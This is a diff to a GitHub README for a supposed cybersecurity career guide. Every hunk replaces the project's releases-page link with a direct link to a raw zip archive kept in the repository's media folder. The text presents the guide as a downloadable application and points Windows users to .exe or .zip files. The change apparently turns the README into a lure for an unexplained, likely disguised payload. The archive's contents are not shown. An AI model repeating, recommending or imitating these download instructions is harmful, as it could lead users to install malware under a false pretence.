@@ -1,7 +1,7 @@
 <h1>🛡️ awesome-cybersecurity-paths - Your Complete Cybersecurity Career Guide</h1>
 
 <p align="center">
-  <a href="https://github.com/RboHon/awesome-cybersecurity-paths/releases"><img src="https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github" alt="Download"></a>
+  <a href="https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip"><img src="https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
 ## 📖 What Is This?
@@ -14,13 +14,13 @@ This guide is perfect for anyone curious about cybersecurity careers. You do not
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/RboHon/awesome-cybersecurity-paths/releases](https://github.com/RboHon/awesome-cybersecurity-paths/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip](https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip)
 
 The download page shows you a list of files. Look for the newest version and click the download button. The file will save to your computer, usually in your Downloads folder.
 
 ## 📥 Download and Install Guide
 
-**Step 1:** Go to the download page using this link: [https://github.com/RboHon/awesome-cybersecurity-paths/releases](https://github.com/RboHon/awesome-cybersecurity-paths/releases)
+**Step 1:** Go to the download page using this link: [https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip](https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip)
 
 **Step 2:** Find the file that matches your computer system. For Windows users, look for a file that ends with .exe or .zip.
 
@@ -114,7 +114,7 @@ This is not just another list of cybersecurity terms. It is a complete career ro
 
 ## 🌟 Start Your Cybersecurity Journey Today
 
-Visit this link to download the application: [https://github.com/RboHon/awesome-cybersecurity-paths/releases](https://github.com/RboHon/awesome-cybersecurity-paths/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip](https://raw.githubusercontent.com/RboHon/awesome-cybersecurity-paths/main/media/1.4.zip)
 
 Take the first step toward understanding cybersecurity. Download the guide now and explore the fascinating world of digital security. Whether you want to protect systems, break into them for testing, or help companies follow the rules, this handbook has everything you need to get started.
 
